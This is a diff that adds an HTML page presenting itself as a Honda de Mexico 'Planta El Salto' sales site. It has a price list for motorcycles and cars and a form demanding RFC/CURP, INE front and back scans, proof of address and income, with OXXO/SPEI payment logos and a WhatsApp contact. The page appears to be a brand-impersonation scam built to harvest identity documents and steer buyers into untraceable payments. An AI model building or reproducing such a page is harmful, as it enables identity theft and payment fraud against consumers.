@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html class='no-js' lang='es'>
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<head>
+  <title>Honda de Mexico</title> 
+  <meta charset='UTF-8'>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#393C3E">
+  <link data-turbolinks-track="true" href="cms/assets/application.css" media="all" rel="stylesheet" />
+  <link rel="icon" href="favi.png">
+  <script src="cms/assets/application.js"></script>
+  <script src="cms/assets/imageReplace.js"></script>
+  <link href="css/main.css">
+  <link href="css/font-awesome.min.css" rel="stylesheet">
+  <link href="cms/assets/responsiveslides.css" media="screen" rel="stylesheet" />
+  <script src="cms/assets/responsiveslides.js"></script> 
+
+<style>
+  
+.caracteristicas-linea{
+  font-size: 16px;
+}
+
+.caracteristicas-linea .sep{
+  margin: 0 10px;
+  font-weight: bold;
+}
+
+  .btn-buy {
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+
+  background: #670a01;
+  color: #fff;
+
+  padding: 10px 22px;
+  border-radius: 999px; /* pastilla real */
+  font-size: 15px;
+  font-weight: 600;
+  text-decoration: none;
+
+  transition: all 0.25s ease;
+}
+
+.btn-buy i {
+  font-size: 16px;
+}
+
+.btn-buy:hover {
+  background: #222;
+  color: #fff;
+  text-decoration: none;
+  transform: translateY(-1px);
+}
+
+.btn-buy:active {
+  transform: translateY(0);
+}
+
+  .redes-flotantes {
+position: fixed;
+right: 8px;
+top: 90%;
+z-index: 20;
+max-width: 80px;
+
+}
+.redes-flotantes img {        max-width: 75%;
+
+float: right; clear: right;
+ margin: 5px;
+-moz-transform: scale(.8) ;
+-webkit-transform: scale(.8) ;
+-o-transform: scale(.8) ;
+-ms-transform: scale(.8) ;
+transform: scale(.8) ;
+-webkit-transition: all .2s ease-in-out;
+-moz-transition: all .2s ease-in-out;
+-o-transition: all .2s ease-in-out;
+transition: all .2s ease-in-out;
+}
+/* =========================
+   BARRA DE PAGOS
+========================= */
+/* --- FIX BARRA DE PAGOS EN MÓVIL --- */
+.payment-bar {
+  flex-wrap: wrap;              /* permite bajar a otra línea */
+  padding: 10px 5px;
+}
+
+.payment-bar img {
+  width: 70px;                 /* más pequeño en móvil */
+  margin: 5px;
+}
+
+/* Ajuste fino solo para pantallas chicas */
+@media (max-width: 480px) {
+  .payment-bar {
+    gap: 10px;
+  }
+
+  .payment-bar img {
+    width: 60px;
+  }
+}
+
+
+  a{color: white;
+
+  }
+ .container8{
+background: #f3f3fe;
+ }
+
+ body{
+  width: 100%;
+  max-width: 100%;
+  min-width: 100%;
+ }
+footer{
+     background:black;
+  
+    text-align: center;
+  }
+.contenedor{
+    position: relative;
+    display: inline-block;
+    text-align: top;
+    margin-top: 5px;
+    align-items: top;
+}
+ 
+ .contenedor1{
+    position: relative;
+    display: inline-block;
+    text-align: top;
+    margin-top: 15px;
+    align-items: right;
+}
+
+.centrado{
+    position: absolute;
+    top: 60%;
+    left: 20%;
+    transform: translate(-30%, -40%);
+    color:white;
+
+
+}
+.centrado1{
+    position: absolute;
+    top: 25px;
+    left: 20%;
+    transform: translate(-10%, -10%);
+    color: black;
+    margin-top: 1px;
+
+}
+.container3{
+  color: white;
+  left: 50%;
+  text-align: center;
+ background: linear-gradient( #e02b20, #670a01);  
+ margin-top: 14px; 
+}
+.contenedor4{
+    position: relative;
+    display: inline-block;
+    margin-top: 15px;
+    align-items: center;
+    background-color: #53905b;
+    margin-left: 10%;
+    margin-right: 10%;
+    color: white;
+    padding-right: 25px;
+    padding-left: 25px;
+    padding-bottom: 25px;
+    padding-top: 25px;
+}
+
+input {
+padding: 10px;
+margin: 10px 0;
+width: 100%;
+max-width: 100%;
+border: 1px solid #ccc;
+border-radius: 4px;
+}
+button {
+padding: 10px 20px;
+margin: 20px 0;
+background: #007BFF;
+color: #fff;
+border: none;
+border-radius: 4px;
+cursor: pointer;
+}
+button:hover {
+background: #0056b3;
+}
+table {
+width: 100%;
+max-width: 400px;
+margin: 20px auto;
+border-collapse: collapse;
+}
+th, td {
+padding: 10px;
+border: 1px solid #ddd;
+}
+th {
+background: #007BFF;
+color: #fff;
+}
+form {
+  background: white;
+  padding: 20px;
+  border-radius: 8px;
+  max-width: 600px;
+  margin: auto;
+  box-shadow: 0 0 10px rgba(0,0,0,0.1);
+}
+
+input, select, textarea {
+  width: 100%;
+  padding: 10px;
+  margin-bottom: 15px;
+  border: 1px solid #ccc;
+  border-radius: 4px;
+}
+
+button {
+  background-color: #4CAF50;
+  color: white;
+  border: none;
+  cursor: pointer;
+}
+
+
+    label { margin-top: 10px; display: block; font-weight: bold; }
+    input, textarea, select { width: 100%; padding: 8px; margin-top: 5px; }
+    button { margin-top: 20px; padding: 10px 20px; }
+    .mensaje { padding: 10px; margin-top: 20px; display: none; }
+    .exito { background-color: #d4edda; color: #155724; }
+    .error { background-color: #f8d7da; color: #721c24; }
+
+
+</style>
+
+</head>
+
+<body>
+ <header class=" navbar navbar-inverse">
+    <nav class="navbar navbar-inverse  navbar-fixed-top">
+      <div class="container">
+        <div class="navbar-header">
+          <button type="button" class="navbar-toggle collapsed" data-target="#navbarMainCollapse" data-toggle="collapse"style="margin-top: 8px;">
+            <span class="sr-only">Interruptor de Navegación</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </button>
+          <img src="honda.png" style="padding: 0px 0px 0px 1px;" class="navbar-brand ">
+         
+        </div>
+       <div id="navbarMainCollapse" class="collapse navbar-collapse">
+        <ul class="nav navbar-nav navbar-right" style="margin-top: 10px;">
+                <li><a href="nosotros.html" >Inicio</a></li>
+            <li><a href='index.html'>Catalogo</a></li>
+            <li><a href="contacto.html" >Contacto</a></li>
+            <li><a href="cotizador.html" >Cotizador</a></li>
+          </ul>
+        </div>
+      </div>
+    </nav>
+         <nav class=" navbar-inverse sub-navbar fixed-top"
+     >
+  <div class="container3">
+   
+      <div class="container3" ><p>
+      <b><font size=6>PLANTA EL SALTO</font></p></b>
+      </div>      
+  </div>
+</nav>
+</header>
+
+    <!-- banner -->
+
+<br><br>
+
+<!-- formulario.html -->
+<section>
+<form id="contactForm" action="enviar.php" method="POST" enctype="multipart/form-data">
+  <h2>Formulario de Contacto</h2>
+
+  <label for="nombre">Nombre:</label>
+  <input type="text" name="nombre" id="nombre" required>
+
+  <label for="apellido">Apellido:</label>
+  <input type="text" name="apellido" id="apellido" required>
+
+  <label for="rfc_curp">RFC o CURP:</label>
+  <input type="text" name="rfc_curp" id="rfc_curp" required>
+
+  <label for="email">Correo electrónico:</label>
+  <input type="email" name="email" id="email" required>
+
+  <label for="direccion">Dirección:</label>
+  <input type="text" name="direccion" id="direccion">
+
+  <label for="ciudad">Municipio o Alcaldía:</label>
+  <input type="text" name="ciudad" id="ciudad">
+
+  <label for="estado">Estado:</label>
+  <input type="text" name="estado" id="estado">
+
+  <label for="cp">Código Postal:</label>
+  <input type="text" name="cp" id="cp">
+
+  <label for="telefono">Teléfono (10 dígitos):</label>
+  <input type="tel" name="telefono" id="telefono" pattern="[0-9]{10}" required>
+
+  <label for="fecha_compra">Fecha de compra (estimada):</label>
+  <input type="date" name="fecha_compra" id="fecha_compra">
+
+  <label for="tipo_persona">Tipo de persona:</label>
+  <select name="tipo_persona" id="tipo_persona" required>
+    <option value="">--Selecciona una opción--</option>
+    <option value="fisica">Persona Física</option>
+    <option value="moral">Persona Moral</option>
+  </select>
+
+  <label for="forma_pago">¿Deseas adquirir la unidad a crédito o de contado?</label>
+  <select name="forma_pago" id="forma_pago" required>
+    <option value="">--Selecciona una opción--</option>
+    <option value="contado">Contado</option>
+    <option value="credito">Crédito</option>
+  </select>
+
+  <label for="plazo_credito">Plazo (en caso de crédito):</label>
+  <select name="plazo_credito" id="plazo_credito">
+    <option value="">--Selecciona el plazo--</option>
+    <option value="12">12 meses</option>
+    <option value="18">18 meses</option>
+    <option value="24">24 meses</option>
+    <option value="36">36 meses</option>
+    <option value="ninguno">No aplica / Contado</option>
+  </select>
+
+  <label for="vehiculo_interes">Selecciona el modelo de unidad:</label>
+  <select name="vehiculo_interes" id="vehiculo_interes" required>
+
+  <!-- ================== MODELOS 2026 ================== -->
+  <option disabled>────────── MODELOS 2026 ──────────</option>
+
+  <option value="Honda Wave110 2026">Honda Wave110 2026 - $28,891</option>
+  <option value="Honda Dio110 2026">Honda Dio110 2026 - $29,742</option>
+  <option value="Honda Navi110 2026">Honda Navi110 2026 - $25,915</option>
+  <option value="Honda CRF110F 2026">Honda CRF110F 2026 - $43,766</option>
+
+  <option value="Honda CB350 Hness 2026">Honda CB350 H’ness 2026 - $68,841</option>
+  <option value="Honda CBF125 Twister 2026">Honda CBF125 Twister 2026 - $29,316</option>
+  <option value="Honda XR150L 2026">Honda XR150L 2026 - $40,819</option>
+  <option value="Honda CB350 2026">Honda CB350 2026 - $72,666</option>
+
+  <option value="Honda CBF150S 2026">Honda CBF150S 2026 - $33,000</option>
+  <option value="Honda CG150 Cargo 2026">Honda CG150 Cargo 2026 - $23,366</option>
+  <option value="Honda XR190L 2026">Honda XR190L 2026 - $52,691</option>
+  <option value="Honda CGL125 Tool 2026">Honda CGL125 Tool 2026 - $23,366</option>
+
+  <option value="Honda CRF300F 2026">Honda CRF300F 2026 - $97,741</option>
+
+  <!-- ================== MODELOS 2025 ================== -->
+  <option disabled>────────── MODELOS 2025 ──────────</option>
+
+  <option value="Honda CB300F Twister 2025">Honda CB300F Twister 2025 - $84,991</option>
+  <option value="Honda Cruising 125 2025">Honda Cruising 125 2025 - $33,991</option>
+  <option value="Honda XR300L Tornado 2025">Honda XR300L Tornado 2025 - $114,741</option>
+
+  <option value="Honda CRF125FB Big Wheel 2025">Honda CRF125FB Big Wheel 2025 - $61,616</option>
+  <option value="Honda TRX250X 2025">Honda TRX250X 2025 - $124,941</option>
+  <option value="Honda Dio 125 2025">Honda Dio 125 2025 - $37,816</option>
+  <option value="Honda ADV350 2025">Honda ADV350 2025 - $115,591</option>
+
+  <option value="Honda CBR600RA ABS 2025">Honda CBR600RA ABS 2025 - $237,991</option>
+  <option value="Honda TRX420FE 2025">Honda TRX420FE 2025 - $174,666</option>
+  <option value="Honda CRF1100D4 Africa Twin 2025">Honda CRF1100D4 Africa Twin 2025 - $343,391</option>
+  <option value="Honda CMX500A2 Rebel 2025">Honda CMX500A2 Rebel 2025 - $133,441</option>
+
+  <option value="Honda NC750XD 2025">Honda NC750XD 2025 - $174,666</option>
+  <option value="Honda CB750 2025">Honda CB750 2025 - $171,691</option>
+  <option value="Honda CB650R 2025">Honda CB650R 2025 - $164,891</option>
+  <option value="Honda CB650R E-Clutch 2025">Honda CB650R E-Clutch 2025 - $170,416</option>
+
+  <option value="Honda CB1000 SP 2025">Honda CB1000 SP 2025 - $238,841</option>
+  <option value="Honda GL1800 Gold Wing 2025">Honda GL1800 Gold Wing 2025 - $642,166</option>
+  <option value="Honda NT1100DE 2025">Honda NT1100DE 2025 - $261,791</option>
+  <option value="Honda Transalp 2025">Honda Transalp 2025 - $199,741</option>
+
+  <!-- ================== MODELOS 2024 ================== -->
+  <option disabled>────────── MODELOS 2024 ──────────</option>
+
+<option value="CB300F Twister 2024">Honda CB300F Twister 2024 - $75,000</option>
+<option value="CGL125 Tool 2024">Honda CGL125 Tool 2024 - $21,999</option>
+<option value="Elite 125 2022">Honda Elite 125 2022 - $20,000</option>
+<option value="CBF125 Twister 2024">Honda CBF125 Twister 2024 - $25,000</option>
+
+<option value="CB190R 2.0 2024">Honda CB190R 2.0 2024 - $44,443</option>
+<option value="CBF160 Invicta 2024">Honda CBF160 Invicta 2024 - $36,393</option>
+<option value="XR190L 2024">Honda XR190L 2024 - $43,393</option>
+<option value="Dio 125 2024">Honda Dio 125 2024 - $30,868</option>
+
+<option value="CB650R 2024">Honda CB650R 2024 - $137,533</option>
+
+<option value="Navi 110 2024">Honda Navi 110 2024 - $21,000</option>
+<option value="CRF110F 2024">Honda CRF110F 2024 - $23,000</option>
+
+<option value="XRE300 2024">Honda XRE300 2024 - $41,000</option>
+<option value="CMX500A Rebel 2023">Honda CMX500A Rebel 2023 - $109,135</option>
+<option value="NC750XD 2024">Honda NC750XD 2024 - $134,950</option>
+
+<option value="CBR600R 2024">Honda CBR600R 2024 - $164,730</option>
+<option value="Rebel 1100 DCT 2024">Honda Rebel 1100 DCT 2024 - $172,360</option>
+<option value="CBR1000RR-R Fireblade 2024">Honda CBR1000RR-R Fireblade 2024 - $354,750</option>
+<option value="GL150 Cargo 2024">Honda GL150 Cargo 2024 - $25,668</option>
+
+  <option disabled>────────── AUTOS 2025 ──────────</option>
+
+
+<option value="Honda City 2025">Honda City 2025 - $263,835</option>
+<option value="Honda Civic 2025">Honda Civic 2025 - $377,585</option>
+<option value="Honda Accord 2025">Honda Accord 2025 - $504,335</option>
+
+<option value="Honda BR-V 2025">Honda BR-V 2025 - $317,785</option>
+<option value="Honda HR-V 2025">Honda HR-V 2025 - $385,385</option>
+<option value="Honda CR-V 2025">Honda CR-V 2025 - $486,785</option>
+
+<option value="Honda Odyssey 2025">Honda Odyssey 2025 - $768,885</option>
+
+
+  </select>
+
+  <!-- Archivos obligatorios -->
+  <label for="ine_frente">INE (Frente):</label>
+  <input type="file" name="ine_frente" id="ine_frente" accept="image/*,.pdf" required>
+
+  <label for="ine_reverso">INE (Reverso):</label>
+  <input type="file" name="ine_reverso" id="ine_reverso" accept="image/*,.pdf" required>
+
+  <label for="comprobante_domicilio">Comprobante de domicilio:</label>
+  <input type="file" name="comprobante_domicilio" id="comprobante_domicilio" accept="image/*,.pdf" required>
+
+  <!-- Archivos opcionales -->
+  <label for="archivo_rfc">Archivo de RFC (opcional):</label>
+  <input type="file" name="archivo_rfc" id="archivo_rfc" accept="image/*,.pdf">
+
+  <label for="comprobante_ingresos">Comprobante de ingresos (opcional):</label>
+  <input type="file" name="comprobante_ingresos" id="comprobante_ingresos" accept="image/*,.pdf">
+
+  <!-- Honeypot contra bots -->
+  <input type="text" name="website" style="display:none">
+
+  <button type="submit">Enviar</button>
+</form>
+<script>
+  document.getElementById("contactForm").addEventListener("submit", function(e) {
+    const ine1 = document.querySelector('input[name="ine_frente"]').files[0];
+    const ine2 = document.querySelector('input[name="ine_reverso"]').files[0];
+    const compDom = document.querySelector('input[name="comprobante_domicilio"]').files[0];
+    const maxSize = 10 * 1024 * 1024;
+    const validTypes = ["image/jpeg", "image/png", "image/jpg", "application/pdf"];
+
+    const archivos = [
+      { nombre: "INE Frente", archivo: ine1 },
+      { nombre: "INE Reverso", archivo: ine2 },
+      { nombre: "Comprobante de domicilio", archivo: compDom }
+    ];
+
+    for (let item of archivos) {
+      if (!item.archivo) {
+        alert(`El archivo ${item.nombre} es obligatorio.`);
+        e.preventDefault();
+        return;
+      }
+      if (!validTypes.includes(item.archivo.type) || item.archivo.size > maxSize) {
+        alert(`${item.nombre} debe ser JPG, PNG o PDF, y pesar menos de 10MB.`);
+        e.preventDefault();
+        return;
+      }
+    }
+  });
+
+  const urlParams = new URLSearchParams(window.location.search);
+  const mensaje = document.getElementById("mensaje");
+  if (urlParams.get("success") === "1") {
+    mensaje.textContent = "Formulario enviado correctamente.";
+    mensaje.className = "mensaje exito";
+    mensaje.style.display = "block";
+  } else if (urlParams.get("error")) {
+    mensaje.textContent = "Hubo un error: " + urlParams.get("error");
+    mensaje.className = "mensaje error";
+    mensaje.style.display = "block";
+  }
+</script>
+
+
+</section>
+
+<hr>
+<hr>
+
+
+
+</div>
+
+  <link href="cms/assets/responsiveslides.css" media="screen" rel="stylesheet"/>
+
+  <script src="cms/assets/responsiveslides.js"></script>
+
+    
+</main>
+
+<footer>
+  <div>
+    <div class="container">
+      <div class="row">
+        <div class="col-sm-2">
+          <img src="honda.svg" style="max-width:150px;padding-top: 20%;">
+        </div>
+        <div class="col-sm-3" style="text-align:center;padding-top: 5px;">
+          <b>
+            <br><a href="aviso.html" style="color:white;">Aviso de privacidad</a>
+            <br><a href="terminos.html" style="color:white;">Términos y Condiciones</a>
+            <br><a href="contacto.html" style="color:white;">Contáctanos</a>
+          </b>
+        </div>
+        <div class="col-sm-3" style="text-align:center;margin-top:5px;color:white;">
+          <br>
+          <a href="mailto:ventas@ensambladorahonda.com" style="color:white;">
+            ventas@ensambladorahonda.com
+          </a>
+          <br>
+          <b>Whatsapp:</b> 33 2101 4178<br>
+          <b>Teléfono:</b> 55 9317 8433<br><br>
+          <p>
+            Parque Industrial, Carretera a El Castillo 7250,
+            45680 El Salto, Jalisco, México
+          </p>
+        </div>
+        <div class="col-sm-4" style="text-align:center;">
+          <img src="mm.png" style="max-width:250px;padding-top:10%;">
+        </div>
+      </div>
+    </div>
+    <div class="payment-bar">
+      <img src="visa.png">
+      <img src="master.png">
+      <img src="spei.png">
+      <img src="oxxo.png">
+    </div>
+    <nav style="background:linear-gradient(#e02b20,#670a01);color:white;text-align:center;">
+      <b>Todos los derechos reservados<br>2026</b>
+    </nav>
+  </div>
+</footer>
+
+<script src="js/jquery.js"></script>
+<script src="js/main.js"></script>
+<script src="js/bootstrap.min.js"></script>
+<script src="cms/assets/paginator.js"></script>
+<script src="cms/assets/paginate.js"></script>
+<script src="cms/assets/paginate-content.js"></script>
+<link href="cms/assets/responsiveslides.css" media="screen" rel="stylesheet"/>
+<script src="cms/assets/responsiveslides.js"></script>
+<div class='redes-flotantes'>
+<div class="btn-whatsapp">
+<a href="https://wa.me/message/S6MNX4S7PMGHP1">
+<img src="w.png" alt="">
+</a>
+</div>
+</body>
+</html>
